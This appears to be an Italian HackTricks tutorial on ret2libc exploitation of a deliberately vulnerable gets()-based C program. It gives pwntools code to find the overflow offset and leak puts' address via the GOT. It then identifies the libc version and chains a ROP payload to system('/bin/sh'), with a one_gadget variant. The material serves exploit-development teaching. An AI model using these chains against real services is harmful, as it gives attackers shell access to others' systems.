# Ottenere l'indirizzo della libc con ROP

<details>

<summary><strong>Impara l'hacking AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se desideri vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Riepilogo Rapido

1. **Trova** l'offset dell'overflow
2. **Trova** il gadget `POP_RDI`, `PUTS_PLT` e i gadget `MAIN`
3. Utilizza i gadget precedenti per **ottenere l'indirizzo di memoria** di puts o un'altra funzione della libc e **trova la versione della libc** ([scaricala](https://libc.blukat.me))
4. Con la libreria, **calcola il ROP ed esploralo**

## Altri tutorial e binari per esercitarsi

Questo tutorial sfrutta il codice/binario proposto in questo tutorial: [https://tasteofsecurity.com/security/ret2libc-unknown-libc/](https://tasteofsecurity.com/security/ret2libc-unknown-libc/)\
Altri tutorial utili: [https://made0x78.com/bseries-ret2libc/](https://made0x78.com/bseries-ret2libc/), [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)

## Codice

Nome file: `vuln.c`
```c
#include <stdio.h>

int main() {
char buffer[32];
puts("Simple ROP.\n");
gets(buffer);

return 0;
}
```

```bash
gcc -o vuln vuln.c -fno-stack-protector -no-pie
```
## Modello ROP - Leak LIBC

Scarica l'exploit e posizionalo nella stessa directory dell'eseguibile vulnerabile e fornisci i dati necessari allo script:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## 1- Trovare l'offset

Il modello necessita di un offset prima di continuare con l'exploit. Se non ne viene fornito alcuno, eseguir√† il codice necessario per trovarlo (per impostazione predefinita `OFFSET = ""`):
```bash
###################
### Find offset ###
###################
OFFSET = ""#"A"*72
if OFFSET == "":
gdb.attach(p.pid, "c") #Attach and continue
payload = cyclic(1000)
print(r.clean())
r.sendline(payload)
#x/wx $rsp -- Search for bytes that crashed the application
#cyclic_find(0x6161616b) # Find the offset of those bytes
return
```
**Esegui** `python template.py` verr√† aperta una console GDB con il programma che si √® bloccato. All'interno di quella **console GDB** esegui `x/wx $rsp` per ottenere i **byte** che sovrascriveranno il RIP. Infine ottieni l'**offset** utilizzando una console **python**:
```python
from pwn import *
cyclic_find(0x6161616b)
```
![](<../../../../.gitbook/assets/image (1004).png>)

Dopo aver trovato l'offset (in questo caso 40) cambia la variabile OFFSET all'interno del modello utilizzando quel valore.\
`OFFSET = "A" * 40`

Un altro modo sarebbe utilizzare: `pattern create 1000` -- _eseguire fino a ret_ -- `pattern seach $rsp` da GEF.

## 2- Trovare i Gadgets

Ora dobbiamo trovare i gadgets ROP all'interno del binario. Questi gadgets ROP saranno utili per chiamare `puts` per trovare la **libc** in uso e successivamente per **eseguire l'exploit finale**.
```python
PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid to call puts
MAIN_PLT = elf.symbols['main']
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
RET = (rop.find_gadget(['ret']))[0]

log.info("Main start: " + hex(MAIN_PLT))
log.info("Puts plt: " + hex(PUTS_PLT))
log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
```
Il `PUTS_PLT` √® necessario per chiamare la **funzione puts**.\
Il `MAIN_PLT` √® necessario per chiamare di nuovo la **funzione principale** dopo un'interazione per **sfruttare** nuovamente il **buffer overflow** (round infiniti di sfruttamento). **Viene utilizzato alla fine di ogni ROP per richiamare il programma nuovamente**.\
Il **POP\_RDI** √® necessario per **passare** un **parametro** alla funzione chiamata.

In questo passaggio non √® necessario eseguire nulla poich√© tutto verr√† trovato da pwntools durante l'esecuzione.

## 3- Trovare la libreria libc

√à ora di trovare quale versione della libreria **libc** viene utilizzata. Per farlo, andremo a **rivelare** l'**indirizzo** in memoria della **funzione** `puts` e poi andremo a **cercare** in quale **versione della libreria** si trova la versione di puts in quell'indirizzo.
```python
def get_addr(func_name):
FUNC_GOT = elf.got[func_name]
log.info(func_name + " GOT @ " + hex(FUNC_GOT))
# Create rop chain
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)

#Send our rop-chain payload
#p.sendlineafter("dah?", rop1) #Interesting to send in a specific moment
print(p.clean()) # clean socket buffer (read all and print)
p.sendline(rop1)

#Parse leaked address
recieved = p.recvline().strip()
leak = u64(recieved.ljust(8, "\x00"))
log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
#If not libc yet, stop here
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))

return hex(leak)

get_addr("puts") #Search for puts address in memmory to obtains libc base
if libc == "":
print("Find the libc library and continue with the exploit... (https://libc.blukat.me/)")
p.interactive()
```
Per farlo, la linea pi√π importante del codice eseguito √®:
```python
rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
```
Questo invier√† alcuni byte fino a che **sovrascrivere** il **RIP** √® possibile: `OFFSET`.\
Successivamente, imposter√† l'**indirizzo** del gadget `POP_RDI` in modo che il prossimo indirizzo (`FUNC_GOT`) venga salvato nel registro **RDI**. Questo perch√© vogliamo **chiamare puts** passandogli l'**indirizzo** del `PUTS_GOT` poich√© l'indirizzo in memoria della funzione puts √® salvato nell'indirizzo puntato da `PUTS_GOT`.\
Dopo di ci√≤, verr√† chiamato `PUTS_PLT` (con `PUTS_GOT` all'interno del **RDI**) in modo che puts legger√† il contenuto all'interno di `PUTS_GOT` (l'indirizzo della funzione puts in memoria) e lo **stamper√†**.\
Infine, la **funzione principale viene chiamata di nuovo** in modo da poter sfruttare nuovamente l'overflow.

In questo modo abbiamo **ingannato la funzione puts** per **stampare** l'**indirizzo** in **memoria** della funzione **puts** (che si trova nella libreria **libc**). Ora che abbiamo quell'indirizzo possiamo **verificare quale versione di libc viene utilizzata**.

![](<../../../../.gitbook/assets/image (1046).png>)

Poich√© stiamo **sfruttando** un **binario locale**, non √® **necessario** scoprire quale versione di **libc** viene utilizzata (basta trovare la libreria in `/lib/x86_64-linux-gnu/libc.so.6`).\
Ma, in caso di exploit remoto, spiegher√≤ qui come puoi trovarlo:

### 3.1- Ricerca della versione di libc (1)

Puoi cercare quale libreria viene utilizzata sulla pagina web: [https://libc.blukat.me/](https://libc.blukat.me)\
Ti permetter√† anche di scaricare la versione di **libc** scoperta

![](<../../../../.gitbook/assets/image (218).png>)

### 3.2- Ricerca della versione di libc (2)

Puoi anche fare:

* `$ git clone https://github.com/niklasb/libc-database.git`
* `$ cd libc-database`
* `$ ./get`

Ci vorr√† del tempo, sii paziente.\
Per far funzionare questo abbiamo bisogno di:

* Nome del simbolo di Libc: `puts`
* Indirizzo di Libc leakato: `0x7ff629878690`

Possiamo capire quale **libc** √® pi√π probabile che venga utilizzata.
```bash
./find puts 0x7ff629878690
ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64)
archive-glibc (id libc6_2.23-0ubuntu11_amd64)
```
Otteniamo 2 corrispondenze (dovresti provare la seconda se la prima non funziona). Scarica la prima:
```bash
./download libc6_2.23-0ubuntu10_amd64
Getting libc6_2.23-0ubuntu10_amd64
-> Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb
-> Downloading package
-> Extracting package
-> Package saved to libs/libc6_2.23-0ubuntu10_amd64
```
Copia la libc da `libs/libc6_2.23-0ubuntu10_amd64/libc-2.23.so` nella nostra directory di lavoro.

### 3.3- Altre funzioni per il leak
```python
puts
printf
__libc_start_main
read
gets
```
## 4- Trovare l'indirizzo basato sulla libc e sfruttarlo

A questo punto dovremmo conoscere la libreria libc utilizzata. Poich√© stiamo sfruttando un binario locale, user√≤ semplicemente: `/lib/x86_64-linux-gnu/libc.so.6`

Quindi, all'inizio di `template.py` cambia la variabile **libc** in: `libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") #Imposta il percorso della libreria quando lo conosci`

Dando il **percorso** alla **libreria libc**, il resto dello **sfruttamento verr√† calcolato automaticamente**.

All'interno della funzione `get_addr` verr√† calcolato l'**indirizzo base della libc**:
```python
if libc != "":
libc.address = leak - libc.symbols[func_name] #Save libc base
log.info("libc base @ %s" % hex(libc.address))
```
{% hint style="info" %}
Si noti che **l'indirizzo di base finale di libc deve terminare in 00**. Se non √® il tuo caso, potresti aver rivelato una libreria errata.
{% endhint %}

Successivamente, l'indirizzo della funzione `system` e l'**indirizzo** della stringa _"/bin/sh"_ verranno **calcolati** dall'**indirizzo di base** di **libc** e dalla **libreria libc** fornita.
```python
BINSH = next(libc.search("/bin/sh")) - 64 #Verify with find /bin/sh
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
```
Infine, l'exploit di esecuzione /bin/sh sta per essere preparato e inviato:
```python
rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)

p.clean()
p.sendline(rop2)

#### Interact with the shell #####
p.interactive() #Interact with the conenction
```
Spieghiamo questo ultimo ROP.\
L'ultimo ROP (`rop1`) ha finito chiamando di nuovo la funzione principale, quindi possiamo **sfruttare nuovamente** il **buffer overflow** (per questo il `OFFSET` √® qui di nuovo). Quindi, vogliamo chiamare `POP_RDI` puntando all'**indirizzo** di _"/bin/sh"_ (`BINSH`) e chiamare la funzione **system** (`SYSTEM`) poich√© l'indirizzo di _"/bin/sh"_ verr√† passato come parametro.\
Infine, viene **chiamato l'indirizzo della funzione di uscita** in modo che il processo **termini correttamente** e non venga generato alcun avviso.

**In questo modo l'exploit eseguir√† una shell \_/bin/sh**.

![](<../../../../.gitbook/assets/image (162).png>)

## 4(2)- Utilizzando ONE\_GADGET

Potresti anche utilizzare [**ONE\_GADGET**](https://github.com/david942j/one_gadget) per ottenere una shell anzich√© utilizzare **system** e **"/bin/sh". ONE\_GADGET** trover√† all'interno della libreria libc un modo per ottenere una shell utilizzando solo un **indirizzo ROP**.\
Tuttavia, di solito ci sono alcune restrizioni, le pi√π comuni e facili da evitare sono come `[rsp+0x30] == NULL`. Poich√© controlli i valori all'interno del **RSP**, devi solo inviare alcuni valori NULL in pi√π in modo che la restrizione venga evitata.

![](<../../../../.gitbook/assets/image (751).png>)
```python
ONE_GADGET = libc.address + 0x4526a
rop2 = base + p64(ONE_GADGET) + "\x00"*100
```
## FILE DI EXPLOIT

Puoi trovare un modello per sfruttare questa vulnerabilit√† qui:

{% content-ref url="rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-template.md)
{% endcontent-ref %}

## Problemi Comuni

### MAIN\_PLT = elf.symbols\['main'] non trovato

Se il simbolo "main" non esiste. Allora puoi trovare dove si trova il codice principale:
```python
objdump -d vuln_binary | grep "\.text"
Disassembly of section .text:
0000000000401080 <.text>:
```
e impostare manualmente l'indirizzo:
```python
MAIN_PLT = 0x401080
```
### Puts non trovato

Se il binario non sta utilizzando Puts, dovresti controllare se sta utilizzando

### `sh: 1: %s%s%s%s%s%s%s%s: not found`

Se trovi questo **errore** dopo aver creato **tutto** l'exploit: `sh: 1: %s%s%s%s%s%s%s%s: not found`

Prova a **sottrarre 64 byte all'indirizzo di "/bin/sh"**:
```python
BINSH = next(libc.search("/bin/sh")) - 64
```
<details>

<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** üí¨ [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
